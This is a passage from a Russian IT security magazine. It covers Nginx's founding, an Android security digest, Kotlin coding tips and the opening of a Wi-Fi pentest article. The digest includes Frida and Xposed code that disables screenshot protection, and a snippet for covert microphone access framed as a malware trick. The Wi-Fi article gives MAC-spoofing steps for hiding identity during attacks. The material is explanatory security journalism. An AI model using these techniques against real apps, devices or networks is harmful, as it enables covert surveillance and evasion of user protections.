на Nginx «со стороны», свежим взглядом, поэтому спо собен писать так, чтобы
всем все было понятно. Кроме того, у Рус лана огромный опыт участия в раз‐
работке и документирова нии слож ных программных проектов.


— Пред лагаю перейти к вопросам, связан ным с компанией Nginx
и с тем, как вы вооб ще приш ли к соз данию биз неса.
Сейчас все расскажу. Итак, наверное, году в 2008‐м пришло мне первое
письмо от инвестора, я уже не помню даже, кто это был. В общем, за пос‐
ледние два года таких писем было око ло десятка. Люди хотели что‐то сделать
с Nginx, сделать компанию. Но я отка зывался, поскольку я в целом не особо
бизнесмен. Но в конце концов я стал понимать, что что‐то делать нужно, ина‐
че я просто не смогу дальше в одиночку развивать проект, уже не хватало сил
на все.
  Довольно много времени ушло на то, чтобы осмыслить, как и с кем я
хотел бы сделать компанию «вокруг» Nginx. Вооб ще, я очень редко меняю
направле ние жизни: например, до Рамблера я семь лет работал в одной ком‐
пании, в Рамблере я тоже прорабо тал десять лет. Перемены для меня
тяжелы. Но тем не менее к весне этого года я все‐таки окончательно решил
основать компанию, которая бы помогла дальнейшему развитию проекта.
Отчасти на этот шаг меня вдохновил Сергей Белоусов, создатель Parallels
и фонда Runa Capital. Мы с ним несколько раз неформально общались, и в
итоге я постепенно стал значитель но ближе к идее соз дать компанию.


— Сергей уме ет убеж дать, да?
— Сергей вообще очень интересный человек, с ним всегда увлекательно
обсуждать дела и не только, он очень энергичный человек. Сергей также
довольно властный руководитель — я думаю, он влияет на очень многие
решения в своих компаниях, это владелец, который любит контролировать
происходящее, непосредственно учас твовать в биз несе.
  Вообще, процесс перего воров с инвесторами, под писание условий сдел‐
ки, куча все го — это вещь тяжелая, потому что, во‐первых, очень много скуч‐
ных деталей, огромное количество бумаги на английском языке, юридичес‐
кой, ее на русском‐то языке читать тяжело, а по‐английски — тем более.
Обговаривание всего, опять же согласова ние всех вещей: мы хотим то‐то,
они хотят то‐то. Психоло гически это тяжело. Зато потом, если инвесторы
понимают твой бизнес, все ста новится значитель но легче.


— Инте ресно: вы работали в Рамбле ре и тру дились над Nginx.
У Рамбле ра не было никаких прав? Это такой тон кий вопрос.
Как удалось сохранить права на про ект?
— Да, это довольно тон кий вопрос. Он, конечно, интересу ет не только вас,
и мы довольно основательно его проработали. В России законодательство
устроено так, что компании принадлежит то, что сделано в рамках трудовых
обязанностей либо по отдельному договору. То есть должен быть договор
с человеком, где было бы ска зано: нужно разработать программный продукт.
В Рамблере я работал сис темным администра тором, разработкой занимал ся
в свободное вре мя, про дукт с самого начала выпус кался под лицензией BSD,
как открытое программное обеспечение. В Рамблере Nginx начал при менять‐
ся уже тогда, когда основной функционал был готов. Более того, даже первое
применение Nginx было не в Рамблере, а на сай тах Rate.ee и zvuki.ru.


— Кто еще у вас работает в компании Nginx?
— Еще у нас работает Сергей Будневич — системный администратор, он
занимается поддержкой инфраструктуры компании. Инфраструктура у нас
не очень большая, но она есть. У нас есть спис ки рассылки, у нас есть поч‐
товый сервер, автоматическая сборка, тес тирова ние пекеджей, трекинг оши‐
бок и др. Сергей нам с этим очень помога ет. Мы сей час собираемся готовить
пакеты еще для нескольких Linux‐дистрибутивов: CentOS, Ubuntu. Сергей
занят автоматизацией раз нообразных процес сов, связанных с раз работкой,
тестированием и сопровождением. Есть еще два человека: один человек
занимается мар кетингом — Андрей Алексеев, а Максим Коновалов — вооб‐
ще начальник всего, он делает так, что компания работает.


— А как официально называется ваша дол жность в компании?
— Формально я — тех ничес кий директор. Я не умею руководить людьми, я
больше фокусируюсь на архитектуре будущих про дуктов и передаче раз‐
работки «в команду». Довольно тяжело делегировать работу, однако ком‐
пания создавалась как раз с целью улучшить разработку и продукт, поэтому
сейчас я пытаюсь себя это му научить. Коллеги занимаются организацион‐
ными вопросами, общением с клиента ми, маркетингом, отношениями с пар‐
тнерами, документацией, наймом персонала и др. Раз ных сложностей у нас
много, научиться общаться на разных уровнях — это бывает не так легко.
На самом деле мы все учас твуем во всех делах компании, поскольку ком‐
пания не такая большая, а дел много.


— Делегировать было слож но, потому что казалось, что все пло хо
делают, про ще самому?
— Ну да, подход такой, что я лучше это сам сделаю, потому что это будет луч‐
ше, или потому что долго объяснять, что нужно делать, или психологически
тяжело сказать: «Сделай вот это». Лично мне делеги ровать полномочия было
тяжело по ряду причин. Сейчас, как техничес кий директор, я в основном отве‐
чаю за архитектуру и качество раз работки.


— Игорь, большое вам спасибо за интервью! Вид но, что вы
все‑таки научились делегировать: со все ми нашими биз нес‑воп-
росами вы нас отправили к Мак симу Коновалову.
— Кстати, это первое интервью, которое я даю. Согласился только из‐за того,
что создали компанию. Буквально весной меня попросили люди из другого
ИТ‐издания, я сказал им: «Извините, я не люблю, не хочу и не умею».


— Еще раз спасибо! Мак сим, в перего ворах с инвесто рами вы
пред ставляли какой‑то формализо ван ный биз нес‑план? На чем
вы вооб ще планиру ете зарабатывать деньги?
— В основном фонды инвестировали в Nginx как в очень перспективный про‐
дукт. Детальный бизнес‐план, конечно, был важен, но аме риканские инвесто‐
ры подходят к вопросу инвестиций, базируясь не только и не столько на биз‐
нес‐плане, где будет написано, что мы заработаем за год столько‐то с точ‐
ностью до десятков центов. Важно было то, что Nginx сейчас очень популя‐
рен, это уже готовый, существу ющий продукт.
  По поводу того, что у нас за идеи для зараба тывания денег: мы хотим
прежде всего добиться правиль ного баланса меж ду бес платным и платным
функционалом. Мы хотим сделать то, что не совсем удалось в прошлом
целому ряду компаний. Есть несколько примеров бизнеса на базе раз‐
работок open source, где компании не смогли удержать нужный баланс,
пришлось закрывать какие‐то фичи в самом про дукте, просить за них
какие‐то нелепые деньги, это всех расс троило, и продукты перестали раз‐
виваться.


— То есть вы хотите сде лать отдельный коммерческий про дукт
и найти баланс меж ду откры тым про дук том и коммерческим?
Мы не хотим делать отдель ный коммерческий продукт, мы хотим делать ком‐
мерческие надстрой ки над основным про дуктом open source. Он будет раз‐
виваться, будут появляться фичи, которые требуются сообщес тву. Деньги,
которые мы получили, помогут нам пос тавить все производство продукта
на новый уровень. Сейчас Игорь уже не в одиночку работает над кодом, стро‐
ится командная разработка. Мы принимаем на работу людей в России, инже‐
нерная команда в Москве оста нется.
  Соответственно, фокус на продукте open source — он очень сильный
и будет оставаться таким.
  В то же время мы знаем, что есть клиенты, боль шие компании, средние
компании, даже маленькие компании, которые долгое время используют Ng‐
inx. Они построили на этом бизнес и благодарны нам. Когда мы встречаемся,
то слышим что‐то вроде: «Отличный, замеча тельный продукт — спасибо вам
большое! Но нам не хватает того‐то и того‐то. Можете ли вы это сделать —
мы вам готовы платить?» Из таких раз говоров у нас постепенно складывается
цепочка того, что мы могли бы про давать, не огорчая при этом сторонников
продукта free open source и не подрывая доверия к проекту в целом. То есть
мы собираем подобные запросы и сравнива ем их с пожеланиями, которые
поступают от сообщества пользователей. Мы смот рим, где есть пересе чения
и, если понимаем, что какой‐то функционал на самом деле необходим всем,
а не какой‐то отдельной компании, мы это реализуем в бес платной версии
продукта.
   Есть даже компании, которые говорят: «Давай те мы вам заплатим за все
эти фичи, чтобы они быстрее появились в продукте. Мы хотим, чтобы все
попало в open source, мы не хотим, чтобы фича была эксклюзивная и/или
платная». Это называется sponsored development.
  Пока у нас сфор мировались идеи, что коммерческие надстройки будут
больше относиться  к крупным примерам применения  Nginx: например,
с помощью коммерческих надстроек будет легче управлять тысячами инстан‐
сов, будет расширенный мониторинг производитель нос ти, допол нительный
функционал, рассчитанный на хостинговые, облачные и CDN‐инфраструк‐
туры.


— То есть у вас фокус имен но на про дук те. Не будете отдельно
про давать услу ги, например, по внед рению, кон салтин гу?
— Дело в том, что компания малень кая, она будет оставаться маленькой —
расти до компании в нес колько сотен человек мы не хотим. Мы активно
работаем с пар тнерами, с системными интегратора ми, с вендорами софта
и железа, активно ищем каналы для работы через партнеров. Консультации
будут  осуществляться  час тично через партнеров,  час тично через  нас.
К сожалению, услуги консалтинга и техничес кой поддержки всем пользовате‐
лям мы сами, непосредс твенно, предоставлять не сможем.


— А что ждет обыч ных пользовате лей в ближайшее вре мя, пла-
ниру ете какие‑то новые фичи?
— Из истории изменений в коде за последние три месяца, из списка
релизов, которые мы выпустили, видно, что с момента образования компании
мы серьезно активизировали процесс разработки и внесения исправлений.
Мы интегрировали достаточно много и доработок, и новых опций. Добавили,
к примеру, стриминг MP4, о котором Игоря спрашивали нес колько лет.
Работа идет, функционал развивается.


— Я правильно понимаю, что Игорь Сысо ев — главный акционер
компании, а остальная, меньшая доля принад лежит инвесто рам?
— Да, Игорь — основной акционер, всего же учредите лей компании трое,
и есть, естественно, инвесто ры как владельцы, груп па инвесторов — они сов‐
местно владеют какой‐то частью. Кстати, сам процесс получения денег
от инвесторов технически выглядит очень прос то — выпускаются ценные
бумаги по соответствующему законодательству, инвесторы их покупают
за какую‐то сумму. Сумма переходит к вам, вы ее используете на развитие
компании. Именно так все у нас и устро ено.
HEADER





  УЯЗВИМОСТЬ STRANDHOGG И ОБХОД
   ОГРАНИЧЕНИЙ НА ДОСТУП К КАМЕРЕ
          И МИКРОФОНУ




Сегодня в выпус ке: подробности уязвимос‐
ти  StrandHogg,  которая  позволяет  под‐
менить любое приложение в любой версии
Android; обход защиты на доступ к камере,
микрофону  и  местополо жению;  обход          Евгений Зобнин                                                                                      Редактор Unixoid и Mobile
защиты на снятие скрин шотов; хорошие              zobnin@glc.ru
и  плохие  приемы   программирова ния
на   Kotlin;  псевдонимы  типов  данных
и инлайновые клас сы в Kotlin; а также ста‐
тистика по версиям Android от PornHub
и подборка библиотек для программистов.


                ПОЧИТАТЬ


StrandHogg — уяз вимость с «под меной» приложе ний
The StrandHogg vulnerability — подробнос ти нашумевшей уяз вимости всех
версий Android (вклю чая 10), поз воляющей подменить экран (активность)
одного приложения на экран дру гого.
   Что произошло: специалисты норвежской компании Promon обнаружили
в Android уязвимость, которая поз воляет подменить экран (активность)
легитимного приложения, подсунув вмес то нее экран зловредного приложе‐
ния. В результате у злоумышленников появляется возможность провести ата‐
ку с использованием фишинга или, например, запросить для зловредного
приложения допол нитель ные полномочия якобы от лица другого приложения.
   Что произошло на самом деле: в Android  у активностей есть флаг
taskAffinity. Он позволяет ука зать имя задачи (task), в стек активностей
которой попадет указанное приложение. Это нужно для более тонкого
управления стеками обратных переходов. Но есть одна проблема: по умол‐
чанию значение taskAffinity равно имени пакета приложения, а это значит,
что в ряде случаев можно незаметно всунуть активность своего приложения
в стек активностей чужого. А если еще и ука зать флаг allowTaskReparent‐
ing="true", эту активность мож но передвинуть на самый верх и при сле‐
дующем клике по иконке целево го приложения она появится на экране пер‐
вой (то есть будет находиться на вершине стека).





Страшно? Конечно, но, как и обычно, сто ит копнуть глубже — и страх прой‐
дет.
   Во‐первых, об этой «уяз вимос ти» извес тно уже много лет. Предыдущая ее
вариация  называлась  Android  Task  Hijacking,  и  мы  писали  о  ней
еще в 2017 году.
   Во‐вторых, эксплуата ция уязвимос ти требует, чтобы и зловредное при‐
ложение, и приложение‐жертва были уже запущены. Последовательность
действий пользователя должна быть такой: он запускает приложение‐жертву,
возвращается на рабочий стол, затем запускает зловредное приложе ние,
затем снова запускает приложение‐жертву. В этот момент вместо холодного
запуска Android просто показывает самую «верхнюю» активность в стеке, а ей
оказывается активность зловредного приложения.
   В‐третьих, Google действительно отказыва ется исправлять уязвимость
на протяжении несколь ких лет. Просто потому, что это так называемый design
ﬂaw, то есть ошибка проектирова ния, исправление которой сломает сущес‐
твующий софт.
  Наконец, в‐четвертых, у проб лемы уже давно есть решение. Дос таточно
указать taskAffinity="" в элементе Application, и все активности твоего
приложения станут неуязвимы к атаке.
  Мораль: не читайте советских газет, читайте доки по безопасности.


Об ход защиты на снятие скрин шотов
Android Frida hooking: disabling FLAG_SECURE — статья о том, как с помощью
Frida отключить защиту на сня тие скриншота приложения.
   Кратко: Android позволяет раз работчику приложения запретить снимать
скриншоты определен ных активностей при ложения. Для этого необходимо
установить флаг FLAG_SECURE для окна:


public class FlagSecureTestActivity extends Activity {
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE,
WindowManager.LayoutParams.FLAG_SECURE);
        setContentView(R.layout.main);
        ...
    }
}

Обойти эту защиту можно нес колькими способа ми. Например, использовать
модуль Xposed DisableFlagSecure, который перехватывает функцию setFlags
и просто отфильтровывает флаг FLAG_SECURE:


@Override
public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPa
ckageParam) throws Throwable {
    XposedHelpers.findAndHookMethod(Window.class, "setFlags", int.
class, int.class, mRemoveSecureFlagHook);
}


private final XC_MethodHook mRemoveSecureFlagHook = new XC_MethodHook
() {
    @Override
    protected void beforeHookedMethod(MethodHookParam param) throws
Throwable {
        Integer flags = (Integer) param.args[0];
        flags &= ~WindowManager.LayoutParams.FLAG_SECURE;
        param.args[0] = flags;
    }
};

Однако Xposed требует права root на устройстве (есть проект VirtualXposed,
не требующий root, но многие модули в нем не работа ют). Frida, с другой сто‐
роны, может работать на любом устройстве без необходимос ти получать
права root.
   Вот как выглядит тот же код отключения в варианте для Frida:


Java.perform(function () {
    var FLAG_SECURE = 0x2000;
    var Window = Java.use("android.view.Window");
    var setFlags = Window.setFlags;


    setFlags.implementation = function (flags, mask) {
       console.log("Disabling FLAG_SECURE...");
       flags &= ~FLAG_SECURE;
       setFlags.call(this, flags, mask);
    };
});

Использовать так:


$ frida ‐U ‐l наш_скрипт.js ‐f имя.пакета.приложения ‐‐no‐pause


Об ход ограниче ния на доступ к камере, мик рофону и местополо -
жению в фоне
Androids Invisible Foreground Services and How to (Ab)use Them — доклад с кон‐
ференции Black Hat Europe 2019 с опи санием очень простой техники обхода
защиты на доступ к камере, микрофону и мес тополо жению в Android 9 и 10.
  Проблема: в Android 9 появилось ограничение на доступ к камере и мик‐
рофону, если в данный момент приложение находится в фоне. В Android
10 добавилось ограничение на дос туп к мес тоположению с возможностью
выбрать, хочет ли пользователь, чтобы приложение могло получать коор‐
динаты, только пока видимо на экра не, или в фоне тоже.
  Исключение дается толь ко приложениям, име ющим активный foreground‐
сервис, который, в свою очередь, обязан вывес ти видимое пользователю
уведомление и иконку в строке сос тояния.
   Если мы хотим создать гипотетичес кую малварь, лучше оставаться скрыт‐
ными и никаких уведомлений не показывать. Но как это сделать?
  Решение: начиная с пятой версии в Android есть механизм JobScheduler,
который позволяет запускать код периодически или при наступле нии опре‐
деленных событий (например, подключение к зарядному устройству). Мы
могли бы использовать его для периодического запус ка наших шпионских
функций, но задачи JobScheduler’а тоже выполняются в фоне.
  Выход состоит в том, чтобы при нас туплении события JobScheduler’а
запустить сервис, затем сделать его foreground‐сервисом с помощью start‐
Foreground, быстро получить дос туп к камере, микрофону и мес тополо‐
жению и остановить сервис:


@Override
public int onStartCommand(Intent intent, int flags, int startId){
    Notification notification = createCustomNotification();
    this.startForeground(1, notification)
    accessMicrophone();
    stopForeground(true);
    return START_STICKY;
}

Трюк состоит в том, что, если сделать работу дос таточно быстро (по утвер‐
ждению автора доклада — за пять секунд), система просто не покажет уве‐
домление.
   Proof of concept есть на GitHub. Баг уже исправлен, теперь уведомление
будет показано в любом случае.


              РАЗРАБОТЧИКУ


Хо рошие и пло хие приемы программирования на Kotlin
Good And Bad Practices Of Coding In Kotlin — статья о практиках программи‐
рования на Kotlin, хороших и плохих.


Первый пример

fun main {
    val file = File("/my_file")
    val writer = file.printWriter()
    try {
        writer.println("Hello World")
    } catch(__: Exception){
        // Обработка исключения
    } finally {
       writer.close()
    }
}

Это стандартный способ записи строки в файл: открываем файл и с помощью
PrintWriter записываем стро ку. В завершение закрываем PrintWriter даже
в том случае, если будет выброшено исключение.
   Этот код можно переписать так:


fun main () {
    val file = File("/my_file")
    file.printWriter().use {
        it.println("Hello World")
    }
}

В случае с объектами, реализующими интерфейс Closeable (здесь Print‐
Writer), функция‐расширение use автоматически вызывает метод close
после выполнения кода лямбды.


Вто рой пример

val list = listOf("Ahsen", "Bob", "Alex", "Jasmine")
val anotherList = listOf(1, 2, 3, 4)
fun main() {
    val size = list.size
    for(i in 0..size)
       println("Name ‐> ${list[i]} and number ‐> ${anotherList[i]}")
}

Этот код проходит в цикле сра зу по двум спискам. Но в нем есть одна проб‐
лема: если второй список будет длиннее первого, при ложе ние упадет
с исключением ArrayIndexOutOfBoundsException.
    Kotlin позволяет решить эту проблему и заодно сделать код гораз до более
элегантным:


val list = listOf("Ahsen", "Bob", "Alex", "Jasmine")
val anotherList = listOf(1, 2, 3, 4, 5, 6, 7)
fun main() {
    for((name, number) in list.zip(anotherList))
        println("Name ‐> $name and number ‐> $number")
}

Метод zip создает набор пар (pair), где первый элемент пары — значение
из первого списка, вто рой элемент — зна чение из второго с тем же
индексом. В этом примере пара авто матичес ки рас кладывается на перемен‐
ные name и number с помощью дес труктивного оператора.


Тре тий пример

val firstList = listOf("Ahsen", "Bob", "Alex", "Jasmine")
val secondList = listOf("Ahsen", "Jack", "Alen", "Jasmine")
fun main() {
    val result = mutableListOf<String>().apply {
        addAll(secondList)
    }
    for(name in firstList)
       if(!secondList.contains(name))
           result.add(name)
    println(result)
}

Данный код объединяет два однотипных спис ка так, чтобы их значения
не повторялись. Но в Kotlin у списков есть метод union, пред назначенный
именно для этого:


val firstList = listOf("Ahsen", "Bob", "Alex", "Jasmine")
val secondList = listOf("Ahsen", "Jack", "Alen", "Jasmine")
fun main() {
    val result = firstList.union(secondList)
    println(result)
}


Четвертый пример

const val NAME = "Ahsen"
val x = NAME as Int
fun main() {
    println(x)
}

Данный код выбросит исключение ClassCastException, потому что константа
NAME имеет тип не Int. Что бы такого не происходило, можно использовать
оператор as?:


const val NAME = "Ahsen"
val x = NAME as? Int
fun main() {
    println(x)
}

Если приведение типов будет невозможно, переменная x получит значение
null.


Typealias в Kotlin
Maintaining crisp code with type aliases — замет ка о ключевом слове typealias,
которое можно использовать для назначения произвольных имен раз личным
типам данных.
  Представим, что у нас есть список юзеров List<User>. Использовать его
в коде неудобно, автодополнение работает плохо. Поэтому мы хотели бы
придумать для него более прос тое имя.
   Традиционный способ сделать это — завернуть список в класс:


data class Users(val userList: List<User>)

Но в Kotlin есть более простой и лишенный оверхеда вариант:


typealias Users = List<User>

Typealias не вводит новый тип данных и не создает классов, это прос то второе
имя для определенного типа данных. Его можно использовать не только
для сокращения записи, но и для раз деления неймспейсов, если несколько
пакетов содержат классы с одинаковыми именами.
  Другие полезные примеры использования typealias:
 • Более наглядный способ объявления лямбд:


   typealias Result<T> = (T) ‐> Unit


   fun fetchData(callback: Result<String>)

 • Маркировка nullable‐типов:


   typealias MaybeBook = Book?

 • Быстрый доступ к вло жен ным клас сам:


   typealias DialogBuilder = AlertDialog.Builder


   val dialog = DialogBuilder().build()


Инлайновые классы в Kotlin
Low‐overhead wrappers using  inline classes — заметка, рассказывающая,
как использовать инлайновые клас сы Kotlin, чтобы защититься от ошибок
и улучшить читаемость кода.
  Представим, что у нас есть такая функция:


fun renderLocation(latitude: Double, longitude: Double) {
    map.render(latitude, longitude)
}

На первый взгляд все хорошо, но есть проблема: что, если ты случайно
передашь ей долготу вмес то широты и широту вместо дол готы? Они обе име‐
ют тип Double, поэтому у компилятора не будет воз можнос ти пре дупредить
тебя об ошибке.
  Помогут классы‐врапперы:


class Latitude(val value: Double)
class Longitude(val value: Double)


fun renderLocation(latitude: Latitude, longitude: Longitude) {
    map.render(latitude, longitude)
}

Но так ты получишь оверхед, компилятору при дется создать, по сути, два
лишних объекта и выделить для них память в хипе.
  Для решения этой проб лемы в Kotlin 1.3 появились так называемые инлай‐
новые классы:


inline class Latitude(val value: Double)
inline class Longitude(val value: Double)


fun renderLocation(latitude: Latitude, longitude: Longitude) {
    map.render(latitude, longitude)
}

Теперь компилятор сможет автоматически заменить все использования объ‐
ектов классов Latitude и Longitude на Double. Вот так будет выглядеть фун‐
кция renderLocation, декомпилиро ванная в Java:


public static final void renderLocation‐vKZqJUM(double latitude,
double longitude) {
    map.render‐vKZqJUM(latitude, longitude);
}

Обрати внимание на ‐vKZqJUM в конце имени функции. Это хеш, который
добавляет компилятор ко всем функциям, принима ющим инлайновые классы
в качестве аргументов. Он нужен, чтобы в коде случайно не появились две
одинаковые функции с одинаковыми аргу ментами (например, если ты соз‐
даешь еще одну функцию renderLocation с двумя аргументами типа
Double).


Коррек тное выделе ние тек ста на фоне
Contrasting text and icons over background — статья о том, как сделать текст
и иконки читаемыми на раз ном фоне. Автор предлагает алгоритм автомати‐
ческого выбора темного или светлого цвета текста в зависимости от исполь‐
зуемого фона.
  Для начала создадим простую функцию‐рас ширение для определе ния
«уровня темности» фона:


fun @receiver:ColorInt Int.isDark(): Boolean =
    ColorUtils.calculateLuminance(this) < 0.5

Функция использует класс ColorUtils из биб лиотеки androidx.core и возвра‐
щает true, если фон достаточно темный, чтобы белый текст на нем читал ся
хорошо.
  Использовать эту функцию можно так:


val color = Color.parseColor("#e91e63")


if (color.isDark()) {
    colorHex.setTextColor(R.color.white)
    favIcon.setImageResource(R.drawable.ic_favorite_border_white_24dp
)
} else {
    colorHex.setTextColor(R.color.black)
    favIcon.setImageResource(R.drawable.ic_favorite_border_black_24dp
)
}

Здесь color — это цвет фона, а colorHex и favIcon — текстовый виджет
и виджет иконки. Если цвет темный, текст и иконка окрашиваются в белый,
иначе — в черный.
  Но что, если в качес тве фона используется картинка? В этом слу чае мы
можем извлечь из картинки наибо лее значимые цвета (палитру) с помощью
класса Palette и проверить их яркость с помощью функции isDark:


Palette.from(bitmap)
    .maximumColorCount(3)
    .clearFilters()
    .setRegion(bitmap.width ‐ iconSize , 0, bitmap.width, iconSize)
    .generate { palette ‐>
        val lightness = ColorUtils.isDark(palette)
        val isDark = if (lightness == ColorUtils.LIGHTNESS_UNKNOWN) {
            ColorUtils.isDark(bitmap, bitmap.width ‐ iconSize / 2,
iconSize / 2)
        } else {
            lightness == ColorUtils.IS_DARK
        }



        if (isDark) { // Make back icon dark on light images
            favIcon.setImageResource(R.drawable.ic_favorite_bor
der_white_24dp)
        } else {
            favIcon.setImageResource(R.drawable.ic_favorite_bor
der_black_24dp)
        }
    }

Предполагается, что мы раз мещаем нашу иконку в правом верхнем углу кар‐
тинки, поэтому с помощью функции setRegion указываем правый верхний
угол. Затем с помощью ColorUtils.isDark мы выясняем, темная ли
это палитра. Если выяснить это не удалось, про буем определить яркость
отдельно взятого пикселя посередине интересующей нас области. Затем мы
меняем цвет иконки в зависимости от полученных результатов.
   Стоит отметить, что в стандартном клас се ColorUtils из пакета androidx.‐
core нет метода isDark. В данном примере исполь зуется класс ColorUtils
из проекта Plaid.


Статистика распре деле ния версий Android
В мае этого года Google перес тала публиковать статистику по версиям An‐
droid. Однако PornHub испра вил этот недочет, опубликовав собственную ста‐
тистику.
   Что следует иметь в виду при изучении этих данных:
 • Статистика Google покрывает все устройства, которые так или иначе под‐
   клю чались к Google Play. Среди этих устройств есть множество «зво‐
   нилок», старых смартфонов, которые люди продол жают использовать
   спустя много лет пос ле релиза. Ведь звонить, писать и просматривать
   сводку погоды можно с комфортом и на устройстве десятилетней дав‐
   ности.
 • Статистика PornHub, кроме устройств с сервисами Google, также покрыва‐
   ет несертифицированные устройства и устрой ства с кас томны ми прошив‐
   ками, но без сервисов Google.
 • Основная  масса  поль зователей  PornHub —  люди  в  возрасте
   от 18 до 34 лет (данные из той же ста тистики). Другими словами, это те
  самые «активные» поль зователи смартфонов, которые регулярно покупа‐
   ют новые устрой ства.





             ИНСТРУМЕНТЫ


 • Android Malware Sandbox — вир туальная машина для быстрого запуска
  мал вари.


              БИБЛИОТЕКИ


 • Keigen — быстрая библиотека линейной алгебры;
 • Extensions‐list — список всех функций‐расширений, дос тупных в библиоте‐
   ках Android‐KTX;
 • Store — библиотека для загрузки, кеширования и обновления данных
   из сети;
 • Tinker — библиотека для обновления кода и ресурсов при ложения
   без обновления всего пакета;
 • FlowBinding — аналог RxBinding на осно ве Kotlin Flow;
 • AestheticDialogs — раз личные виды диалогов;
 • Flourish — библиотека для показа/скры тия лайотов с анимацией;
 • MaterialDialog‐Android — библиотека для создания диалогов в стиле Mater‐
     ial Design;
 • ParallaxScrollingView — галерея с эффектом параллакса.
COVERSTORY





                                                                          Иван Пискунов
   ВОЗДУШНЫЕ
     ЛОВКОСТИ

                    ПРОСТЫЕ ТРЮКИ,
                   КОТОРЫЕ ВЫРУЧАЮТ
                   ПРИ ПЕНТЕСТЕ WI‐FI





В этой статье я покажу несколько простых и распространен‐
ных, но довольно эффектив ных приемов из практики пен‐
теста сетей Wi‐Fi: скрытие MAC‐адре са при сканировании
сети и атаке на WPA2, выяв ление «спрятан ных» сетей, обход
MAC‐фильтрации и глушение чужой точки доступа.


           WARNING

                     Все советы настоятельно рекомен дуется исполь‐
                        зовать только в целях образования. Блокировка
                      передачи данных и применение рассмот ренных
                       средств  может  преследоваться  по  закону.
                     Для проведения тестов на проникновение тре‐
                        буется  получить  соответствующее  письменное
                      подтверждение  заказчика. Помни,  что данные
                      о деавторизации сохраня ются в логах роутера.



СМЕНА И АВТОМАТИЧЕСКАЯ ГЕНЕРАЦИЯ НОВОГО MAC-АДРЕСА
ПРИ НОВОМ ПОДКЛЮЧЕНИИ К WI-FI
MAC (Media Access Control) — уникальный идентификатор, выдается каждой
единице активного оборудования (то есть сетево му адаптеру, роуте ру, свичу
и так далее) или некоторым их интерфейсам.
  MAC прошит в оборудование при изготовлении и используется в сети
для идентификации отправителя и получа теля фрейма. Предполагается, что
при появлении в сети нового устройства адми нистратору не придется
задавать ему MAC вручную.





             Схема строения шес тиоктетного MAC‐адреса

MAC уникален (или, по крайней мере, должен быть) для каждого сетевого
интерфейса. При этом у устройства их может быть нес колько — например,
у ноутбуков их как минимум два: один у контроллера проводного подключения
по Ethernet, второй — у адаптера Wi‐Fi. У роутера или у свитча адреса уни‐
кальны для каждого порта, а если это роутер Wi‐Fi, то различаться будут адре‐
са  у  каждого  беспроводного  интерфейса  (у  современных  роуте ров
это 2,4 ГГц и 5 ГГц).


Зачем менять MAC?
MAC позволяет однозначно идентифици ровать устройство и не меня ется
при смене операционной системы — он прошит в микросхе му, которая пре‐
доставляет сетевой интерфейс.
  Пентестеры и хакеры скрывают свой MAC, чтобы не допус тить иден‐
тификации оборудования при атаке. Думаю, ты понимаешь, зачем это может
понадобиться: если использовать реаль ный MAC, то он может быть засвечен
при подклю чении к другим сетям. Существуют и средства сопоставления MAC
с географическими координатами — например, скрипт iSniﬀ‐GPS из набора
Kali.


Прак тика
Итак, предположим, что ты используешь Linux. Давай пос мотрим, как сменить
MAC без использования дополнительных программ.
  Открывай терминал и вво ди команду


$ ifconfig | grep HWaddr

Если ты используешь Ethernet, то пос мотреть адреса адаптеров можно так:


$ ifconfig | grep ether

Чтобы временно изменить свой MAC, нуж но выключить соответс твующий
сетевой интерфейс. Например, для интерфейса eth1 команда будет такой:


$ ifconfig eth1 down

Теперь можно сформировать новый MAC.


$ ifconfig eth1 hw ether 00:00:00:00:00:11

Цифры, как ты понимаешь, в этот шаблон можешь подставить любые.
   Теперь нужно снова поднять eth1.


$ ifconfig eth1 up

И последнее — нужно проверить, вступили ли изменения в силу. Если ты сно‐
ва посмотришь список MAC, то увидишь, что интерфейс изменил ся. Однако
после перезагрузки компь ютера старое значение MAC вернется.
  Было бы удобно, если бы MAC изменялся каждый раз при подключении
к сети. В этом нам поможет пакет NetworkManager. Начиная с версии 1.4 эта
программа поддерживает спуфинг MAC, причем у нее есть много полезных
опций.
  Для каждой группы «проводные» (ethernet) и «беспроводные» (wiﬁ) пра‐
вила MAC настраиваются отдельно.
   Также помни, что беспроводной адаптер может находиться в одном
из двух состояний:
 • сканиро вание — зада ется с помощью свойства wifi.scanrand
  macaddress. По умолчанию yes, то есть во время сканирования будет
   устанавливаться произвольный MAC‐адрес. Если выбрать no , то этого
   происходить не будет;
 • под ключен  к  сети —  зада ется  свой ством  wifi.clonedmac
  address, по умол чанию его зна чение равно preserve.

Для проводного интерфейса  (свойство  ethernet.cloned‐mac‐address)
и беспроводного интерфейса в сос тоянии подклю чения (wifi.cloned‐mac‐
address) доступны сле дующие варианты:
 • явно указан ный MAC — то есть мож но задать свой постоянный MAC;
 • permanent — исполь зовать вшитый в устройство MAC‐адрес (по умол‐
   чанию);
 • preserve — не менять MAC устройства после акти вации (например, если
  MAC был изме нен дру гой программой, то будет использоваться текущий
   адрес);
 • random — генерировать случайную величину для каждого подключения.

NetworkManager настра ивается через файл /etc/NetworkManager/Network‐
Manager.conf. Как вариант, можешь добавить дополнительный файл с рас‐
ширением .conf в директорию /etc/NetworkManager/conf.d (называться
конфиг при этом может как угодно). Я рекомендую именно второй способ,
поскольку при обновлении NetworkManager обычно заменя ет главный .conf,
и если ты вносил в него изменения, то они пропадут.


Включаем авто матическую генерацию ран домных MAC-адре сов
Если ты хочешь, чтобы при каждом подключении подменял ся MAC‐адрес,
но при соединении с одной и той же сетью использовал ся одинаковый MAC,
то надо добавить пару строк в конфиг. Вот они:


[connection]
ethernet.cloned‐mac‐address=stable
wifi.cloned‐mac‐address=stable

Свойства ethernet.cloned‐mac‐address и wifi.cloned‐mac‐address мож‐
но задавать по отдельности или вместе.
  Проверить значения ты можешь, набрав ip a, а чтобы изме нения всту‐
пили в силу, нужно переза пус тить NetworkManager:


$ sudo systemctl restart NetworkManager

Теперь подклю чайся к бес проводной сети и снова про веряй значения MAC.
  Для одних и тех же сетей будут генерировать ся оди наковые адреса. Если
же ты хочешь, что бы адреса всегда были разными, настройки будут такими:


[connection]
ethernet.cloned‐mac‐address=random
wifi.cloned‐mac‐address=random


Устанавливаем опре делен ный MAC
Предположим, нам  нужно  использовать  какой‐то  определенный MAC.
Для этого снова будем править /etc/NetworkManager/conf.d/mac.conf.
